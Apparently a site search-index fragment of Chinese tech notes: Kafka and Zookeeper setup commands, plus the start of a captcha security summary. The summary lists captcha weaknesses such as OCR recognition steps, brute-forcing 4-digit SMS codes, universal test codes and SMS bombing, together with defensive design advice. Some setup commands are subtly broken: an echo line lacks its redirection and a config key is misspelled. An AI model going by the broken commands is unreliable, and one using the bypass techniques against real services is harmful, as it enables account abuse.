\u5355\u673a\u7248Kafka \u5728\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u542f\u52a8\u4e00\u6b21\u5373\u53ef\u3002 \u96c6\u7fa4\u7248Kafka \u5355\u8282\u70b9\uff0c\u591aBroker \u5728\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u542f\u52a8\u591a\u6b21Kafka\uff0c\u6ca1\u6b21\u542f\u52a8\u52a0\u8f7d\u7684\u914d\u7f6e\u6587\u4ef6\u9700\u8981\u4e0d\u4e00\u81f4\uff0c\u5e76\u4e14\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684broker_id\u7684\u503c\u4e5f\u9700\u8981\u4e0d\u4e00\u81f4\u4e14\u6bcf\u4e2a\u503c\u552f\u4e00\u3002 kafka-server-start.sh -daemon /opt/kafka2.11/config/server_1.properties # \u5bf9\u5e94broker=1 kafka-server-start.sh -daemon /opt/kafka2.11/config/server_2.properties # \u5bf9\u5e94broker=2 \u591a\u8282\u70b9\uff0c\u591aBroker \u5728\u591a\u53f0\u670d\u52a1\u5668\u542f\u52a8\u5355\u4e2abroker\uff1b\u5728\u591a\u53f0\u670d\u52a1\u5668\u4e0a\u542f\u52a8\u591a\u4e2abroker\u3002 \u6e05\u7406Kafka\u65e5\u5fd7 \u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6709\u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u63a7\u5236\uff1avim /opt/kafka2.11/config/server.properties log.retention.hours=1 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(h) log.retention.minutes=60 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(m) log.retention.ms=3600000 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(s) # \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u5b83\u914d\u7f6e log.retention.bytes=1073741824 # \u65e5\u5fd7\u4fdd\u7559\u5927\u5c0f(bytes) \u4f7f\u7528Kafka \u5907\u6ce8 \u547d\u4ee4 \u521b\u5efatopic kafka-topics.sh --zookeeper 10.10.10.19:2181 --create --replication-factor 1 --partitions 1 --topic topic_name \u5217\u4e3etopic kafka-topics.sh --zookeeper 10.10.10.19:2181 --list \u67e5\u770btopic\u8be6\u60c5 kafka-topics.sh --zookeeper 10.10.10.19:2181 --describe --topic topic_name \u4fee\u6539topic\u5206\u533a kafka-topics.sh --zookeeper 10.10.10.19:2181 --alter --partitions 20 --topic topic_name \u5220\u9664topic kafka-topics.sh --zookeeper 10.10.10.19:2181 --delete --topic topic_name \u542f\u52a8\u6d88\u8d39\u8005 kafka-console-consumer.sh --zookeeper 10.10.10.19:2181 --topic topic_name \u542f\u52a8\u751f\u4ea7\u8005 kafka-console-producer.sh --broker-list 10.10.10.19:9092 --topic topic_name \u6307\u5b9a\u6d88\u8d39\u8005\u4ece\u5934\u6d88\u8d39 --from-beginning \u8e29\u5751 \u5220\u9664topic\u65f6\u62a5\u9519 Note: This will have no impact if delete.topic.enable is not set to true. \u89e3\u51b3\u65b9\u6848\uff1a\u4fee\u6539\u914d\u7f6e # vim /opt/kafka2.11/config/server.properties delete.topic.enble=true","title":"Kafka\u77e5\u8bc6\u4f53\u7cfb"},{"location":"big_data/kafka/#kafka","text":"","title":"Kafka\u77e5\u8bc6\u4f53\u7cfb"},{"location":"big_data/kafka/#centos7kafka","text":"# yum\u5b89\u88c5java\u73af\u5883 # \u4e0b\u8f7d\u5e76\u89e3\u538bKafka wget http://mirror.bit.edu.cn/apache/kafka/2.3.0/kafka_2.11-2.3.0.tgz tar -xf kafka_2.11-2.3.0.tgz # \u79fb\u52a8\u5230\u5408\u7406\u4f4d\u7f6e mv kafka_2.11-2.3.0 /opt/kafka2.11 # \u914d\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf echo export KAFKA_HOME=/opt/kafka2.11 /etc/profile echo export PATH=$PATH:$KAFKA_HOME/bin /etc/profile source /etc/profile # \u6d4b\u8bd5Kafka\uff0c\u4e00\u5b9a\u8981\u4f18\u5148\u542f\u52a8Zookeeper # \u6211\u8fd9\u91cc10.10.10.19:2181\u7aef\u53e3\u4e0a\u662f\u6211\u7684Zookeeper\uff0c\u4e5f\u53ef\u4ee5\u53c2\u89c1\u4e0b\u9762\u7684\u914d\u7f6e\u6587\u4ef6 kafka-server-start.sh -daemon /opt/kafka2.11/config/server.properties # \u67e5\u770b\u662f\u5426\u542f\u52a8\u6210\u529f jps -m","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eKafka"},{"location":"big_data/kafka/#kafka_1","text":"vim /opt/kafka2.11/config/server.properties # \u8282\u70b9\u540d\u79f0 broker.id=0 # \u7ed1\u5b9a\u5730\u5740 listeners=PLAINTEXT://PLAINTEXT:9092 # \u5f53kafka\u5728docker\u6216\u8005\u865a\u62df\u673a\u4e2d\u65f6\uff0c\u9700\u8981\u4f7f\u7528\u4ee5\u4e0b\u53c2\u6570 advertised.listeners=PLAINTEXT://kafka-server:9092 # \u53d1\u9001\u7f13\u5b58\u5b57\u8282\u6570 socket.send.buffer.bytes=102400 # \u63a5\u6536\u7f13\u5b58\u5b57\u8282\u6570 socket.receive.buffer.bytes=102400 # \u6700\u5927\u8bf7\u6c42\u5b57\u8282\u6570\uff0c\u4fdd\u62a4OOM socket.request.max.bytes=104857600 # \u65e5\u5fd7\u76ee\u5f55 log.dirs=/tmp/kafka-logs # \u9ed8\u8ba4\u5206\u533a\u6570 num.partitions=1 # zookeeper\u5730\u5740 zookeeper.connect=10.10.10.19:2181 # zookeeper\u8fde\u63a5\u8d85\u65f6\u65f6\u95f4\uff0c\u5355\u4f4d\u6beb\u79d2 zookeeper.connection.timeout.ms=6000","title":"\u914d\u7f6eKafka"},{"location":"big_data/kafka/#kafka_2","text":"\u5728\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u542f\u52a8\u4e00\u6b21\u5373\u53ef\u3002","title":"\u5355\u673a\u7248Kafka"},{"location":"big_data/kafka/#kafka_3","text":"\u5355\u8282\u70b9\uff0c\u591aBroker \u5728\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\uff0c\u542f\u52a8\u591a\u6b21Kafka\uff0c\u6ca1\u6b21\u542f\u52a8\u52a0\u8f7d\u7684\u914d\u7f6e\u6587\u4ef6\u9700\u8981\u4e0d\u4e00\u81f4\uff0c\u5e76\u4e14\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684broker_id\u7684\u503c\u4e5f\u9700\u8981\u4e0d\u4e00\u81f4\u4e14\u6bcf\u4e2a\u503c\u552f\u4e00\u3002 kafka-server-start.sh -daemon /opt/kafka2.11/config/server_1.properties # \u5bf9\u5e94broker=1 kafka-server-start.sh -daemon /opt/kafka2.11/config/server_2.properties # \u5bf9\u5e94broker=2 \u591a\u8282\u70b9\uff0c\u591aBroker \u5728\u591a\u53f0\u670d\u52a1\u5668\u542f\u52a8\u5355\u4e2abroker\uff1b\u5728\u591a\u53f0\u670d\u52a1\u5668\u4e0a\u542f\u52a8\u591a\u4e2abroker\u3002","title":"\u96c6\u7fa4\u7248Kafka"},{"location":"big_data/kafka/#kafka_4","text":"\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u6709\u53c2\u6570\u53ef\u4ee5\u8fdb\u884c\u63a7\u5236\uff1avim /opt/kafka2.11/config/server.properties log.retention.hours=1 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(h) log.retention.minutes=60 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(m) log.retention.ms=3600000 # \u65e5\u5fd7\u4fdd\u7559\u65f6\u95f4(s) # \u4e5f\u53ef\u4ee5\u4f7f\u7528\u5176\u5b83\u914d\u7f6e log.retention.bytes=1073741824 # \u65e5\u5fd7\u4fdd\u7559\u5927\u5c0f(bytes)","title":"\u6e05\u7406Kafka\u65e5\u5fd7"},{"location":"big_data/kafka/#kafka_5","text":"\u5907\u6ce8 \u547d\u4ee4 \u521b\u5efatopic kafka-topics.sh --zookeeper 10.10.10.19:2181 --create --replication-factor 1 --partitions 1 --topic topic_name \u5217\u4e3etopic kafka-topics.sh --zookeeper 10.10.10.19:2181 --list \u67e5\u770btopic\u8be6\u60c5 kafka-topics.sh --zookeeper 10.10.10.19:2181 --describe --topic topic_name \u4fee\u6539topic\u5206\u533a kafka-topics.sh --zookeeper 10.10.10.19:2181 --alter --partitions 20 --topic topic_name \u5220\u9664topic kafka-topics.sh --zookeeper 10.10.10.19:2181 --delete --topic topic_name \u542f\u52a8\u6d88\u8d39\u8005 kafka-console-consumer.sh --zookeeper 10.10.10.19:2181 --topic topic_name \u542f\u52a8\u751f\u4ea7\u8005 kafka-console-producer.sh --broker-list 10.10.10.19:9092 --topic topic_name \u6307\u5b9a\u6d88\u8d39\u8005\u4ece\u5934\u6d88\u8d39 --from-beginning","title":"\u4f7f\u7528Kafka"},{"location":"big_data/kafka/#_1","text":"","title":"\u8e29\u5751"},{"location":"big_data/kafka/#topic","text":"Note: This will have no impact if delete.topic.enable is not set to true. \u89e3\u51b3\u65b9\u6848\uff1a\u4fee\u6539\u914d\u7f6e # vim /opt/kafka2.11/config/server.properties delete.topic.enble=true","title":"\u5220\u9664topic\u65f6\u62a5\u9519"},{"location":"big_data/zookeeper/","text":"Zookeeper\u77e5\u8bc6\u4f53\u7cfb Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eZookeeper Zookeeper\u4e0b\u8f7d\u5730\u5740\uff1ahttp://mirror.bit.edu.cn/apache/zookeeper/ # \u4f7f\u7528yum\u5b89\u88c5java\u73af\u5883 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u4e0b\u8f7d\u5e76\u89e3\u538bZookeeper\uff0c\u5e76\u79fb\u52a8\u5230\u5408\u7406\u5230\u4f4d\u7f6e tar -xf apache-zookeeper-3.5.5-bin.tar.gz mv apache-zookeeper-3.5.5-bin /opt/zookeeper3.5.5 # \u914d\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf echo export ZOOKEEPER_HOME=/opt/zookeeper3.5.5 /etc/profile echo export PATH=$PATH:$ZOOKEEPER_HOME/bin /etc/profile source /etc/profile \u914d\u7f6eZookeeper # \u590d\u5236\u914d\u7f6e\u6587\u4ef6 cp /opt/zookeeper3.5.5/conf/zoo_sample.cfg /opt/zookeeper3.5.5/conf/zoo.cfg # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /opt/zookeeper3.5.5/conf/zoo.cfg # tickTime=2000 # initLimit=10 # syncLimit=5 # dataDir=/tmp/zookeeper # clientPort=2181 \u542f\u52a8Zookeeper zkServer.sh start Zookeeper\u5ba2\u6237\u7aef # \u542f\u52a8\u5ba2\u6237\u7aef zkCli.sh # \u4ee5\u4e0b\u64cd\u4f5c\u5728\u5ba2\u6237\u7aef\u4ea4\u4e92\u7a97\u53e3\u4e2d\u6267\u884c h:\u67e5\u770b\u5e2e\u52a9 ls /:\u67e5\u770b\u6839\u76ee\u5f55\u8282\u70b9 stat /:\u67e5\u770b\u6839\u8282\u70b9\u72b6\u6001 get /:\u67e5\u770b\u6839\u8282\u70b9\u6570\u636e\u548c\u8be6\u60c5 quit:\u9000\u51fa","title":"Zookeeper\u77e5\u8bc6\u4f53\u7cfb"},{"location":"big_data/zookeeper/#zookeeper","text":"","title":"Zookeeper\u77e5\u8bc6\u4f53\u7cfb"},{"location":"big_data/zookeeper/#centos7zookeeper","text":"Zookeeper\u4e0b\u8f7d\u5730\u5740\uff1ahttp://mirror.bit.edu.cn/apache/zookeeper/ # \u4f7f\u7528yum\u5b89\u88c5java\u73af\u5883 yum install java-1.8.0-openjdk.x86_64 java-1.8.0-openjdk-devel.x86_64 -y # \u4e0b\u8f7d\u5e76\u89e3\u538bZookeeper\uff0c\u5e76\u79fb\u52a8\u5230\u5408\u7406\u5230\u4f4d\u7f6e tar -xf apache-zookeeper-3.5.5-bin.tar.gz mv apache-zookeeper-3.5.5-bin /opt/zookeeper3.5.5 # \u914d\u7f6e\u7cfb\u7edf\u73af\u5883\u53d8\u91cf echo export ZOOKEEPER_HOME=/opt/zookeeper3.5.5 /etc/profile echo export PATH=$PATH:$ZOOKEEPER_HOME/bin /etc/profile source /etc/profile","title":"Centos7\u5b89\u88c5\u4e0e\u914d\u7f6eZookeeper"},{"location":"big_data/zookeeper/#zookeeper_1","text":"# \u590d\u5236\u914d\u7f6e\u6587\u4ef6 cp /opt/zookeeper3.5.5/conf/zoo_sample.cfg /opt/zookeeper3.5.5/conf/zoo.cfg # \u4fee\u6539\u914d\u7f6e\u6587\u4ef6 vim /opt/zookeeper3.5.5/conf/zoo.cfg # tickTime=2000 # initLimit=10 # syncLimit=5 # dataDir=/tmp/zookeeper # clientPort=2181","title":"\u914d\u7f6eZookeeper"},{"location":"big_data/zookeeper/#zookeeper_2","text":"zkServer.sh start","title":"\u542f\u52a8Zookeeper"},{"location":"big_data/zookeeper/#zookeeper_3","text":"# \u542f\u52a8\u5ba2\u6237\u7aef zkCli.sh # \u4ee5\u4e0b\u64cd\u4f5c\u5728\u5ba2\u6237\u7aef\u4ea4\u4e92\u7a97\u53e3\u4e2d\u6267\u884c h:\u67e5\u770b\u5e2e\u52a9 ls /:\u67e5\u770b\u6839\u76ee\u5f55\u8282\u70b9 stat /:\u67e5\u770b\u6839\u8282\u70b9\u72b6\u6001 get /:\u67e5\u770b\u6839\u8282\u70b9\u6570\u636e\u548c\u8be6\u60c5 quit:\u9000\u51fa","title":"Zookeeper\u5ba2\u6237\u7aef"},{"location":"captcha_security/captcha/","text":"\u9a8c\u8bc1\u7801\u5b89\u5168\u603b\u7ed3 Captcha\uff1a\u533a\u5206\u8ba1\u7b97\u673a\u548c\u4eba\u7684\u533a\u522b\u7684\u516c\u5171\u81ea\u52a8\u7a0b\u5e8f\u3002\u5728\u4e92\u8054\u7f51\u7684\u4f7f\u7528\u4e2d\uff0c\u591a\u4e3a\uff1a\u9632\u6b62\u66b4\u529b\u7834\u89e3\u3001\u5237\u7968\u3001\u8bba\u575b\u704c\u6c34\u3001\u722c\u866b\u7b49\u884c\u4e3a\u3002 \u9a8c\u8bc1\u7801\u7684\u5386\u53f2\u53d8\u8fc1 \u6587\u672c\u9a8c\u8bc1\u7801 \u9a8c\u8bc1\u7801\u4ee5\u6587\u5b57\u7684\u5f62\u5f0f\u51fa\u73b0\uff0c\u901a\u5e38\u53ef\u4ee5\u5728html\u6e90\u4ee3\u7801\u4e2d\u627e\u5230\u3002 \u56fe\u7247\u62fc\u63a5\u9a8c\u8bc1\u7801 \u7531N\u5f20\u72ec\u7acb\u7684\u56fe\u7247\u62fc\u63a5\u6210\u4e3a\u4e00\u4e2a\u9a8c\u8bc1\u7801\u3002 \u9898\u5e93\u9a8c\u8bc1\u7801 \u5927\u91cf\u7684\u8ba1\u7b97\u9898\u7ec4\u6210\u7684\u9a8c\u8bc1\u7801\u5e93\uff0c\u6b64\u79cd\u65b9\u5f0f\u6700\u5927\u7684\u5371\u5bb3\u5c31\u662f\u9898\u5e93\u662f\u6709\u9650\u7684\uff0c\u53ef\u4ee5\u88ab\u7a77\u4e3e\u3002 \u56fe\u5f62\u9a8c\u8bc1\u7801 \u56fe\u5f62\u9a8c\u8bc1\u7801\u7684\u98ce\u9669 \u524d\u7aef\u751f\u6210\u9a8c\u8bc1\u7801\uff1a\u524d\u7aef\u751f\u5b58\u6216\u8005\u524d\u7aef\u6821\u9a8c\u90fd\u4f1a\u5b58\u5728\u7ed5\u8fc7\u95ee\u9898\u3002 \u9a8c\u8bc1\u7801\u4e0d\u8fc7\u671f\uff1a\u9a8c\u8bc1\u7801\u4e00\u76f4\u4e0d\u8fc7\u671f\uff0c\u53ef\u4ee5\u91cd\u590d\u6709\u6548\u4f7f\u7528\uff0c\u6216\u8005\u957f\u65f6\u95f4\u6709\u6548\u4f7f\u7528\u3002 \u9a8c\u8bc1\u7801\u8fd4\u56de\u5728response\u6570\u636e\u5305\u4e2d\u3002 \u9a8c\u8bc1\u7801\u53ef\u8bc6\u522b\uff1aOCR\u6280\u672f\u3002 \u56fe\u5f62\u9a8c\u8bc1\u7801\u7684\u81ea\u52a8\u8bc6\u522b\u6280\u672f \u53bb\u566a\u5904\u7406\uff1a\u53bb\u6389\u56fe\u50cf\u91cc\u7684\u5e72\u6270\u4fe1\u606f\uff0c\u5982\uff1a\u80cc\u666f\u7684\u70b9\u3001\u7ebf\u7b49\u3002 \u56fe\u50cf\u4e8c\u503c\u5316\uff1a\u5c06\u56fe\u50cf\u4e0a\u7684\u50cf\u7d20\u70b9\u7070\u5ea6\u503c\u8bbe\u7f6e\u4e3a0\u6216255\uff0c\u4e5f\u5c31\u662f\u5c06\u6574\u4e2a\u56fe\u50cf\u5448\u73b0\u51fa\u9ed1\u767d\u6548\u679c\u3002\u76ee\u7684\u662f\u4e3a\u4e86\u5c06\u56fe\u50cf\u4e0e\u7a7a\u767d\u533a\u5206\u5f00\u6765\uff0c\u65b9\u4fbf\u540e\u7eed\u6b65\u9aa4\u70b9\u8fdb\u884c\u3002 \u5207\u7247\u5904\u7406\uff1a\u5c06\u6bcf\u4e2a\u5b57\u7b26\u6240\u5728\u533a\u57df\u5206\u79bb\u6210\u4e00\u4e2a\u4e2a\u70b9\u56fe\u7247\uff0c\u786e\u4fdd\u4e00\u4e2a\u56fe\u7247\u5185\u4ec5\u6709\u4e00\u4e2a\u6587\u5b57\u3002 \u6587\u5b57\u56fe\u7247\u6807\u51c6\u5316\uff1a\u5bf9\u5207\u7247\u540e\u7684\u6bcf\u4e2a\u5b57\u7b26\u56fe\u7247\uff0c\u8fd8\u9700\u8981\u8fdb\u884c\u53d8\u5f62\u4fee\u590d\u5904\u7406\uff0c\u6bd4\u5982\uff1a\u65cb\u8f6c\u3001\u7f29\u653e\u7b49\u64cd\u4f5c\u5c3d\u91cf\u5c06\u6bcf\u4e00\u4e2a\u5b57\u7b26\u56fe\u7247\u90fd\u8c03\u6574\u5230\u6807\u51c6\u683c\u5f0f\uff0c\u51cf\u5c11\u968f\u673a\u5ea6\u3002 \u5b57\u7b26\u6a21\u7248\u8bc6\u522b\uff1a\u901a\u8fc7\u6a21\u7248\u5bf9\u6bd4\u7684\u65b9\u6cd5\u8bc6\u522b\u3002 \u5982\u4f55\u8bbe\u8ba1\u4e00\u4e2a\u5b89\u5168\u7684\u56fe\u5f62\u9a8c\u8bc1\u7801 \u9a8c\u8bc1\u7801\u540e\u7aef\u968f\u673a\u751f\u6210\uff0c\u4e14\u9a8c\u8bc1\u7801\u5185\u5bb9\u4e0d\u80fd\u51fa\u73b0\u5728\u5ba2\u6237\u7aef\u7684\u7f51\u9875\u6e90\u4ee3\u7801\u4ee5\u53caresponse\u6570\u636e\u5305\u4e2d\u3002 \u9a8c\u8bc1\u7801\u8981\u6709\u80cc\u666f\u5e72\u6270\uff0c\u5e72\u6270\u5143\u7d20\u5305\u62ec\uff1a\u989c\u8272\u3001\u4f4d\u7f6e\u3001\u6570\u91cf\u4e14\u5143\u7d20\u9700\u8981\u968f\u673a\u53d8\u5316\u3002 \u9a8c\u8bc1\u7801\u540e\u7aef\u6821\u9a8c\uff0c\u4e14\u4f7f\u7528\u4e00\u6b21\u540e\u8981\u6c42\u7acb\u5373\u5931\u6548\u3002 \u9a8c\u8bc1\u7801\u5728\u4e0d\u540c\u573a\u666f\u4e0b\u9700\u8981\u4e0e\u8bf7\u6c42\u7684\u53c2\u6570\u4e00\u8d77\u63d0\u4ea4\u7ed9\u540e\u7aef\u8fdb\u884c\u6821\u9a8c\uff0c\u4e14\u4f18\u5148\u6821\u9a8c\u9a8c\u8bc1\u7801\u3002 \u77ed\u4fe1\u9a8c\u8bc1\u7801 \u77ed\u4fe1\u9a8c\u8bc1\u7801\u7684\u98ce\u9669 \u77ed\u4fe1\u9a8c\u8bc1\u7801\u592a\u7b80\u5355\u3001\u77ed\u4fe1\u9a8c\u8bc1\u7801\u65f6\u6548\u98ce\u9669\uff1a\u4e00\u822c4\u4f4d\u7684\u77ed\u4fe1\u9a8c\u8bc1\u7801\u53ef\u4ee5\u572810\u5206\u949f\u5185\u66b4\u529b\u7834\u89e3\u6210\u529f\u3002 \u77ed\u4fe1\u9a8c\u8bc1\u7801\u4e0d\u4e0e\u624b\u673a\u53f7\u7ed1\u5b9a\u3002 \u77ed\u4fe1\u9a8c\u8bc1\u7801\u5185\u5bb9\u8fd4\u56de\u5728response\u6570\u636e\u5305\u4e2d\u3002 \u4e07\u80fd\u77ed\u4fe1\u9a8c\u8bc1\u7801\uff1a111111\u3001000000\u3001666666\u3001888888\u3002 \u77ed\u4fe1\u70b8\u5f39\u653b\u51fb\uff1a\u7531\u4e8e\u53d1\u9001\u77ed\u4fe1\u63a5\u53e3\u6ca1\u6709\u8bbe\u7f6e\u9891\u6b21\u4e0a\u9650\u5bfc\u81f4\u3002 \u77ed\u4fe1\u5185\u5bb9\u81ea\u5b9a\u4e49\uff1a\u5e38\u51fa\u73b0\u5728\u4e00\u4e9b\u53d1\u9001\u77ed\u4fe1\u7684\u540e\u7aef\u7ba1\u7406\u7cfb\u7edf\u4e2d\uff0c\u5bb9\u6613\u51fa\u73b0\u7c7b\u4f3c\u9493\u9c7c\u7b49\u7c7b\u578b\u7684\u653b\u51fb\u3002 \u77ed\u4fe1\u5e73\u53f0\u81ea\u8eab\u95ee\u9898\uff1a\u88ab\u5165\u4fb5\u3002 \u76d1\u542c\uff1a\u8fd0\u8425\u5546\u4e0a\u884c\u4e0e\u4e0b\u884c\u53ef\u80fd\u51fa\u73b0\u7684\u76d1\u542c\u3001\u4f2a\u57fa\u7ad9\u3001GSM\u3002 \u624b\u673a\u6728\u9a6c\u3001APP Content Provider\u8bbe\u8ba1\u7f3a\u9677\u3001\u77ed\u4fe1\u540c\u6b65\u5230\u4e91\u5e73\u53f0\u5bfc\u81f4\u6cc4\u6f0f\u3002 \u5b89\u5168\u7684\u77ed\u4fe1\u9a8c\u8bc1\u7801 \u8bf7\u6c42\u83b7\u53d6\u77ed\u4fe1\u63a5\u53e3\u6dfb\u52a0\u56fe\u5f62\u9a8c\u8bc1\u7801\u3002 \u5355\u4f4d\u65f6\u95f4\u5185\uff1a\u5355\u4e2aIP\u3001\u5355\u4e2a\u624b\u673a\u53f7\u8bbe\u7f6e\u8bf7\u6c42\u9650\u5236\uff0c\u5177\u4f53\u9700\u8981\u6839\u636e\u573a\u666f\u800c\u5b9a\u3002 \u5355\u4e2a\u624b\u673a\u53f7\u6bcf\u65e5\u77ed\u4fe1\u9a8c\u8bc1\u7801\u83b7\u53d6\u4e0a\u9650\u3002 \u53d1\u9001\u77ed\u4fe1\u63a5\u53e3\u5730\u5740\u767d\u540d\u5355\u3002 \u8bed\u97f3\u9a8c\u8bc1\u7801 \u8bed\u97f3\u9a8c\u8bc1\u7801\u7684\u98ce\u9669 \u547c\u53eb\u8f6c\u79fb\u3002 \u8bed\u97f3\u9a8c\u8bc1\u7801\u6210\u672c\u592a\u9ad8\u3002 \u65b0\u4e00\u4ee3\u9a8c\u8bc1\u7801 Google reCaptcha\uff1a\u76ee\u524d\u5df2\u7ecf\u66f4\u65b0\u5230 \u7b2c\u4e09\u4ee3 \u6ed1\u52a8\u9a8c\u8bc1\u7801 \u70b9\u9009\u9a8c\u8bc1\u7801 \u65b0\u4e00\u4ee3\u9a8c\u8bc1\u7801\u7684\u98ce\u9669 \u63a5\u7801\u5e73\u53f0 \u5728\u7ebf\u63a5\u53d7\u77ed\u4fe1 \u6613\u7801\u5e73\u53f0 \u7528\u6237\u884c\u4e3a\u6a21\u62df Python Selenium","title":"\u9a8c\u8bc1\u7801\u5b89\u5168\u603b\u7ed3"},{"location":"captcha_security/captcha/#_1","text":"Captcha\uff1a\u533a\u5206\u8ba1\u7b97\u673a\u548c\u4eba\u7684\u533a\u522b\u7684\u516c\u5171\u81ea\u52a8\u7a0b\u5e8f\u3002\u5728\u4e92\u8054\u7f51\u7684\u4f7f\u7528\u4e2d\uff0c\u591a\u4e3a\uff1a\u9632\u6b62\u66b4\u529b\u7834\u89e3\u3001\u5237\u7968\u3001\u8bba\u575b\u704c\u6c34\u3001\u722c\u866b\u7b49\u884c\u4e3a\u3002","title":"\u9a8c\u8bc1\u7801\u5b89\u5168\u603b\u7ed3"},{"location":"captcha_security/captcha/#_2","text":"","title":"\u9a8c\u8bc1\u7801\u7684\u5386\u53f2\u53d8\u8fc1"},{"location":"captcha_security/captcha/#_3","text":"\u9a8c\u8bc1\u7801\u4ee5\u6587\u5b57\u7684\u5f62\u5f0f\u51fa\u73b0\uff0c\u901a\u5e38\u53ef\u4ee5\u5728html\u6e90\u4ee3\u7801\u4e2d\u627e\u5230\u3002","title":"\u6587\u672c\u9a8c\u8bc1\u7801"},{"location":"captcha_security/captcha/#_4","text":"\u7531N\u5f20\u72ec\u7acb\u7684\u56fe\u7247\u62fc\u63a5\u6210\u4e3a\u4e00\u4e2a\u9a8c\u8bc1\u7801\u3002","title":"\u56fe\u7247\u62fc\u63a5\u9a8c\u8bc1\u7801"},{"location":"captcha_security/captcha/#_5","text":"\u5927\u91cf\u7684\u8ba1\u7b97\u9898\u7ec4\u6210\u7684\u9a8c\u8bc1\u7801\u5e93\uff0c\u6b64\u79cd\u65b9\u5f0f\u6700\u5927\u7684\u5371\u5bb3\u5c31\u662f\u9898\u5e93\u662f\u6709\u9650\u7684\uff0c\u53ef\u4ee5\u88ab\u7a77\u4e3e\u3002","title":"\u9898\u5e93\u9a8c\u8bc1\u7801"},{"location":"captcha_security/captcha/#_6","text":"","title":"\u56fe\u5f62\u9a8c\u8bc1\u7801"},{"location":"captcha_security/captcha/#_7","text":"\u524d\u7aef\u751f\u6210\u9a8c\u8bc1\u7801\uff1a\u524d\u7aef\u751f\u5b58\u6216\u8005\u524d\u7aef\u6821\u9a8c\u90fd\u4f1a\u5b58\u5728\u7ed5\u8fc7\u95ee\u9898\u3002 \u9a8c\u8bc1\u7801\u4e0d\u8fc7\u671f\uff1a\u9a8c\u8bc1\u7801\u4e00\u76f4\u4e0d\u8fc7\u671f\uff0c\u53ef\u4ee5\u91cd\u590d\u6709\u6548\u4f7f\u7528\uff0c\u6216\u8005\u957f\u65f6\u95f4\u6709\u6548\u4f7f\u7528\u3002 \u9a8c\u8bc1\u7801\u8fd4\u56de\u5728response\u6570\u636e\u5305\u4e2d\u3002 \u9a8c\u8bc1\u7801\u53ef\u8bc6\u522b\uff1aOCR\u6280\u672f\u3002","title":"\u56fe\u5f62\u9a8c\u8bc1\u7801\u7684\u98ce\u9669"},{"location":"captcha_security/captcha/#_8","text":"\u53bb\u566a\u5904\u7406\uff1a\u53bb\u6389\u56fe\u50cf\u91cc\u7684\u5e72\u6270\u4fe1\u606f\uff0c\u5982\uff1a\u80cc\u666f\u7684\u70b9\u3001\u7ebf\u7b49\u3002 \u56fe\u50cf\u4e8c\u503c\u5316\uff1a\u5c06\u56fe\u50cf\u4e0a\u7684\u50cf\u7d20\u70b9\u7070\u5ea6\u503c\u8bbe\u7f6e\u4e3a0\u6216255\uff0c\u4e5f\u5c31\u662f\u5c06\u6574\u4e2a\u56fe\u50cf\u5448\u73b0\u51fa\u9ed1\u767d\u6548\u679c\u3002\u76ee\u7684\u662f\u4e3a\u4e86\u5c06\u56fe\u50cf\u4e0e\u7a7a\u767d\u533a\u5206\u5f00\u6765\uff0c\u65b9\u4fbf\u540e\u7eed\u6b65\u9aa4\u70b9\u8fdb\u884c\u3002 \u5207\u7247\u5904\u7406\uff1a\u5c06\u6bcf\u4e2a\u5b57\u7b26\u6240\u5728\u533a\u57df\u5206\u79bb\u6210\u4e00\u4e2a\u4e2a\u70b9\u56fe\u7247\uff0c\u786e\u4fdd\u4e00\u4e2a\u56fe\u7247\u5185\u4ec5\u6709\u4e00\u4e2a\u6587\u5b57\u3002 \u6587\u5b57\u56fe\u7247\u6807\u51c6\u5316\uff1a\u5bf9\u5207\u7247\u540e\u7684\u6bcf\u4e2a\u5b57\u7b26\u56fe\u7247\uff0c\u8fd8\u9700\u8981\u8fdb\u884c\u53d8\u5f62\u4fee\u590d\u5904\u7406\uff0c\u6bd4\u5982\uff1a\u65cb\u8f6c\u3001\u7f29\u653e\u7b49\u64cd\u4f5c\u5c3d\u91cf\u5c06\u6bcf\u4e00\u4e2a\u5b57\u7b26\u56fe\u7247\u90fd\u8c03\u6574\u5230\u6807\u51c6\u683c\u5f0f\uff0c\u51cf\u5c11\u968f\u673a\u5ea6\u3002 \u5b57\u7b26\u6a21\u7248\u8bc6\u522b\uff1a\u901a\u8fc7\u6a21\u7248\u5bf9\u6bd4\u7684\u65b9\u6cd5\u8bc6\u522b\u3002","title":"\u56fe\u5f62\u9a8c\u8bc1\u7801\u7684\u81ea\u52a8\u8bc6\u522b\u6280\u672f"},{"location":"captcha_security/captcha/#_9","text":"\u9a8c\u8bc1\u7801\u540e\u7aef\u968f\u673a\u751f\u6210\uff0c\u4e14\u9a8c\u8bc1\u7801\u5185\u5bb9\u4e0d\u80fd\u51fa\u73b0\u5728\u5ba2\u6237\u7aef\u7684\u7f51\u9875\u6e90\u4ee3\u7801\u4ee5\u53caresponse\u6570\u636e\u5305\u4e2d\u3002 \u9a8c\u8bc1\u7801\u8981\u6709\u80cc\u666f\u5e72\u6270\uff0c\u5e72\u6270\u5143\u7d20\u5305\u62ec\uff1a\u989c\u8272\u3001\u4f4d\u7f6e\u3001\u6570\u91cf\u4e14\u5143\u7d20\u9700\u8981\u968f\u673a\u53d8\u5316\u3002 